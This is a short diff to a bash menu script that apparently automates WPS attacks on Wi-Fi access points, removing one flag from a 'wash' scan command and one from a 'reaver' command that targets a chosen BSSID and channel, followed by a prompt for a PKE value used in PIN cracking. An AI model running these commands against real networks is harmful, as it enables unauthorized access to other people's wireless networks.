@@ -2191,7 +2191,7 @@ case $menu in
                       then
                            Ver_Mon_Fun
 						   trap kill_wash SIGINT
-						   wash -i $mon -C -o ${Temporary}/wash.txt > /dev/null &
+						   wash -i $mon -o ${Temporary}/wash.txt > /dev/null &
 						   WashID="$!"
 						   disown $WashID
 						   for ((c=0; c<=3; c++))
@@ -2440,7 +2440,7 @@ case $menu in
 								   sleep 1
 						   done
 						   echo "" > ${Temporary}/empty.txt
-                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -vvv -n -L -P -s ${Temporary}/empty.txt
+                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -vvv -n -L -s ${Temporary}/empty.txt
 						   echo ""						   
 					       echo -e -n "$Cyan [+]$Yellow PKE : $Green"
 						   read PKE
